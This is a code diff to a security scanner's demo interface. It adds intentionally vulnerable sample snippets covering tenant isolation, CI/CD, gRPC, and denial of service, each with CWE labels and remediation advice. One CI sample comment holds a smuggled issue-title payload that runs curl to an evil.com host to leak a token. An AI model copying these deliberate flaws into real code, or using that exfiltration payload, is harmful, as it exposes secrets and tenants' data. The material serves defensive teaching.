@@ -35,6 +35,10 @@ interface LiveScannerStudioProps {
 const PRESET_CATEGORIES = [
   'All',
   'AI & Agent Security',
+  'Data Isolation & Multi-Tenant',
+  'Supply Chain & CI/CD',
+  'Protocols & RPC',
+  'Resource & DoS',
   'Taint & Injection',
   'Secrets & Credentials',
   'Memory Safety',
@@ -185,6 +189,251 @@ export async function runAutonomousLoop(agent: Agent, goal: string) {
     name: 'Unbounded Autonomous Delegated Action Loop (Missing Spend/Loop Budget)',
     isClean: false,
     cvssScore: 6.5,
+  },
+  tenant_missing_clause: {
+    id: 'tenant_missing_clause',
+    category: 'Data Isolation & Multi-Tenant',
+    label: 'Missing Tenant Query',
+    title: 'Missing Tenant Boundary Enforcement in SQL Query (TypeScript)',
+    language: 'typescript',
+    code: `// Cloudflare DATA-ISOLATION-AND-LIFECYCLE.md: A tenant field on a record is not isolation
+import { db } from "./database";
+
+// Defect: Function accepts authenticated caller context, but query omits tenant_id predicate
+export async function getInvoiceDetails(userContext: { tenantId: string }, invoiceId: string) {
+  // [SOURCE] invoiceId is caller-supplied
+  // [SINK] Missing tenant isolation: selects by global primary key without tenant binding!
+  const invoice = await db.query(
+    "SELECT id, amount, customer_ssn FROM invoices WHERE id = $1", 
+    [invoiceId] // SENTRA-TENANT-001: Missing AND tenant_id = $2! Cross-tenant disclosure!
+  );
+  return invoice;
+}`,
+    ruleId: 'SENTRA-TENANT-001',
+    cwe: 'CWE-284',
+    severity: 'Critical' as const,
+    name: 'Missing Tenant Boundary Enforcement in Data Query',
+    isClean: false,
+    cvssScore: 9.3,
+  },
+  tenant_cache_collision: {
+    id: 'tenant_cache_collision',
+    category: 'Data Isolation & Multi-Tenant',
+    label: 'Cache Key Collision',
+    title: 'Composite Cache Key Namespace Collision across Tenants (TypeScript)',
+    language: 'typescript',
+    code: `// Cloudflare DATA-ISOLATION-AND-LIFECYCLE.md: Cache key omits tenant namespace
+import { redis } from "./cache";
+
+export async function getCachedUserPreferences(tenantId: string, userId: string) {
+  // [SOURCE] Multi-tenant context
+  // [PROPAGATION] Global shared key without tenant prefix
+  const cacheKey = \`user:prefs:\${userId}\`; // SENTRA-TENANT-002: Collision! Two tenants share userId=1!
+  
+  // [SINK] Cross-tenant cache pollution & unauthorized preference retrieval
+  const cached = await redis.get(cacheKey);
+  if (cached) return JSON.parse(cached);
+  
+  const fresh = await fetchFromDb(tenantId, userId);
+  await redis.set(cacheKey, JSON.stringify(fresh), "EX", 3600);
+  return fresh;
+}`,
+    ruleId: 'SENTRA-TENANT-002',
+    cwe: 'CWE-1188',
+    severity: 'High' as const,
+    name: 'Composite Cache Key Namespace Collision across Tenants',
+    isClean: false,
+    cvssScore: 8.1,
+  },
+  tenant_secret_logging: {
+    id: 'tenant_secret_logging',
+    category: 'Data Isolation & Multi-Tenant',
+    label: 'Secret Logging Sink',
+    title: 'Sensitive Bearer Token Leaked to Shared Diagnostics Sink (Rust)',
+    language: 'rust',
+    code: `// Cloudflare DATA-ISOLATION-AND-LIFECYCLE.md: Alternate readers in analytics/logs
+use tracing::info;
+
+pub fn process_authenticated_webhook(req: &HttpRequest) -> Result<()> {
+    let auth_header = req.headers().get("Authorization").unwrap(); // [SOURCE] Sensitive Bearer Token
+    let token = auth_header.to_str()?;
+    
+    // [SINK] SENTRA-TENANT-004: Sensitive credential emitted into multi-tenant diagnostics sink!
+    info!(
+        request_id = %req.id(),
+        authorization_token = %token, // High-severity leak to shared log aggregators!
+        "Processing inbound webhook payload"
+    );
+    
+    verify_and_dispatch(token, req.body())
+}`,
+    ruleId: 'SENTRA-TENANT-004',
+    cwe: 'CWE-532',
+    severity: 'High' as const,
+    name: 'Sensitive Credential Emitted to Shared Diagnostics / Logging Sink',
+    isClean: false,
+    cvssScore: 7.8,
+  },
+  ci_script_injection: {
+    id: 'ci_script_injection',
+    category: 'Supply Chain & CI/CD',
+    label: 'CI Script Injection',
+    title: 'Untrusted GitHub Context Expression Injection in CI Workflow (YAML)',
+    language: 'yaml',
+    code: `# Cloudflare SUPPLY-CHAIN-AND-RELEASE.md: Untrusted context in privileged runner
+name: Issue Triage Automation
+on:
+  issues:
+    types: [opened]
+
+jobs:
+  triage:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout Code
+        uses: actions/checkout@v4
+      - name: Process Issue Title
+        # [SOURCE] Attacker controls issue title: 'bug"; curl http://evil.com/leak?token=$TOKEN #'
+        # [SINK] Inline bash command interpolation allows arbitrary command injection!
+        run: |
+          echo "Processing issue: \${{ github.event.issue.title }}" # SENTRA-CI-001!`,
+    ruleId: 'SENTRA-CI-001',
+    cwe: 'CWE-78',
+    severity: 'Critical' as const,
+    name: 'Untrusted GitHub Context Expression Injection in CI Workflow',
+    isClean: false,
+    cvssScore: 9.7,
+  },
+  ci_mutable_pinning: {
+    id: 'ci_mutable_pinning',
+    category: 'Supply Chain & CI/CD',
+    label: 'Mutable Action Pinning',
+    title: 'Mutable Action Reference Pinning via Floating Tag (YAML)',
+    language: 'yaml',
+    code: `# Cloudflare SUPPLY-CHAIN-AND-RELEASE.md: Build-to-promotion substitution
+name: Production Deployment Pipeline
+on:
+  push:
+    branches: [main]
+
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    steps:
+      # [SOURCE] Third-party action referenced by mutable git tag @master or @v1
+      # [SINK] SENTRA-CI-002: Malicious upstream maintainer can retag @v1 to compromise CI runner!
+      - name: Third-Party Cloud Publisher
+        uses: untrusted-publisher/deploy-action@v1 # Defect: Must pin immutable SHA256 digest!
+        with:
+          aws_secret_key: \${{ secrets.PROD_AWS_SECRET }}`,
+    ruleId: 'SENTRA-CI-002',
+    cwe: 'CWE-829',
+    severity: 'High' as const,
+    name: 'Mutable Action Reference Pinning via Floating Git Tag',
+    isClean: false,
+    cvssScore: 8.2,
+  },
+  rpc_interceptor_gap: {
+    id: 'rpc_interceptor_gap',
+    category: 'Protocols & RPC',
+    label: 'gRPC Interceptor Gap',
+    title: 'gRPC Streaming Interceptor Gap & Route Inconsistency (TypeScript)',
+    language: 'typescript',
+    code: `// Cloudflare PROTOCOLS-RPC-AND-MESSAGING.md: Interceptor applies to unary but not streaming
+import * as grpc from "@grpc/grpc-js";
+
+const server = new grpc.Server();
+
+// Interceptor only attached to unary service definitions!
+const authInterceptor = createBearerTokenInterceptor();
+
+// Unary handler protected:
+server.addService(BillingService, {
+  getBill: [authInterceptor, handleGetBill], // Protected
+  // [SINK] SENTRA-RPC-001: Streaming telemetry route omitted from auth interceptor chain!
+  streamMetrics: handleLiveMetricsStreaming, // Defect: Unauthenticated streaming RPC!
+});`,
+    ruleId: 'SENTRA-RPC-001',
+    cwe: 'CWE-306',
+    severity: 'High' as const,
+    name: 'gRPC Streaming Interceptor Route Inconsistency',
+    isClean: false,
+    cvssScore: 8.5,
+  },
+  rpc_non_idempotent_queue: {
+    id: 'rpc_non_idempotent_queue',
+    category: 'Protocols & RPC',
+    label: 'Non-Idempotent Consumer',
+    title: 'Non-Idempotent Message Processing in Asynchronous Event Bus (TypeScript)',
+    language: 'typescript',
+    code: `// Cloudflare PROTOCOLS-RPC-AND-MESSAGING.md: Duplicate delivery repeats side-effect
+export async function handlePaymentOrderEvent(eventMessage: { orderId: string; amount: number }) {
+  // [SOURCE] Inbound queue event from Kafka/RabbitMQ (at-least-once delivery semantics)
+  const { orderId, amount } = eventMessage;
+  
+  // [SINK] SENTRA-RPC-002: Side-effect executes without deduplication idempotency check!
+  // If consumer network hiccups before ACK, event re-delivered and customer billed twice!
+  await database.ledger.incrementBalance({
+    accountId: orderId,
+    delta: -amount // Unprotected financial side-effect!
+  });
+  
+  await acknowledgeMessage(eventMessage);
+}`,
+    ruleId: 'SENTRA-RPC-002',
+    cwe: 'CWE-841',
+    severity: 'High' as const,
+    name: 'Non-Idempotent Message Processing in Asynchronous Event Bus',
+    isClean: false,
+    cvssScore: 7.7,
+  },
+  dos_unbounded_reader: {
+    id: 'dos_unbounded_reader',
+    category: 'Resource & DoS',
+    label: 'Unbounded Stream Reader',
+    title: 'Unbounded HTTP Stream Read / Memory Exhaustion (Rust)',
+    language: 'rust',
+    code: `// Cloudflare RESOURCE-EXHAUSTION-AND-AVAILABILITY.md: Unbounded byte stream
+use tokio::io::AsyncReadExt;
+
+pub async fn handle_file_upload(mut stream: tokio::net::TcpStream) -> Result<Vec<u8>> {
+    let mut buffer = Vec::new(); // [SOURCE] Memory allocation
+    
+    // [SINK] SENTRA-DOS-001: Reading without take(MAX_BYTES) limit!
+    // Malicious client sending 100GB infinite stream crashes server via OOM panic!
+    stream.read_to_end(&mut buffer).await?;
+    
+    process_archive(&buffer)?;
+    Ok(buffer)
+}`,
+    ruleId: 'SENTRA-DOS-001',
+    cwe: 'CWE-400',
+    severity: 'High' as const,
+    name: 'Unbounded HTTP Stream Read / Server Memory Exhaustion',
+    isClean: false,
+    cvssScore: 7.9,
+  },
+  dos_redos_backtracking: {
+    id: 'dos_redos_backtracking',
+    category: 'Resource & DoS',
+    label: 'ReDoS Catastrophic Backtracking',
+    title: 'Regular Expression Denial of Service (ReDoS) Catastrophic Backtracking (TypeScript)',
+    language: 'typescript',
+    code: `// Cloudflare RESOURCE-EXHAUSTION-AND-AVAILABILITY.md: Exponential regex backtracking
+export function validateEmailOrUsername(input: string) {
+  // [SOURCE] User-supplied input string
+  // [SINK] SENTRA-DOS-002: Vulnerable polynomial regex with nested overlapping quantifiers
+  const emailRegex = /^([a-zA-Z0-9]+)+@[a-zA-Z0-9]+\\.[a-zA-Z]+$/;
+  
+  // Input: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!" causes CPU freeze for 30+ seconds!
+  return emailRegex.test(input);
+}`,
+    ruleId: 'SENTRA-DOS-002',
+    cwe: 'CWE-1333',
+    severity: 'Medium' as const,
+    name: 'ReDoS Catastrophic Backtracking Pattern',
+    isClean: false,
+    cvssScore: 6.8,
   },
   sqli_taint: {
     id: 'sqli_taint',
@@ -469,8 +718,16 @@ export function LiveScannerStudio({ currentRole, onAddFinding }: LiveScannerStud
             endLine: 20,
             cvssScore: current.cvssScore,
             remediationGuidance: current.ruleId.startsWith('SENTRA-AI-')
-              ? 'Enforce handler-side parameter validation, cryptographic action-binding tokens, and explicit tenant scoping.'
-              : 'Enforce parameterized queries or safe argument vector interfaces.',
+              ? 'Cloudflare AI Security Rule: Enforce handler-side parameter validation, cryptographic action-binding tokens, and explicit tenant scoping.'
+              : current.ruleId.startsWith('SENTRA-TENANT-')
+                ? 'Cloudflare Data Isolation Rule: Always bind authenticated tenant_id in queries, prefix cache keys with tenant namespace, and redact secrets from logging sinks.'
+                : current.ruleId.startsWith('SENTRA-CI-')
+                  ? 'Cloudflare Supply Chain Rule: Pass untrusted context via intermediate environment variables and pin actions by immutable commit digest.'
+                  : current.ruleId.startsWith('SENTRA-RPC-')
+                    ? 'Cloudflare RPC Rule: Enforce authentication interceptors across unary and streaming routes, and enforce idempotency tokens on event consumers.'
+                    : current.ruleId.startsWith('SENTRA-DOS-')
+                      ? 'Cloudflare Availability Rule: Enforce stream byte bounds (take(MAX_BYTES)) and eliminate nested quantifiers in regular expressions.'
+                      : 'Enforce parameterized queries or safe argument vector interfaces.',
             description: `Identified boundary violation matching ${current.ruleId} (${current.cwe}): ${current.name}. Evaluated under Cloudflare defensive security audit rules.`,
             createdAt: new Date().toISOString(),
           },
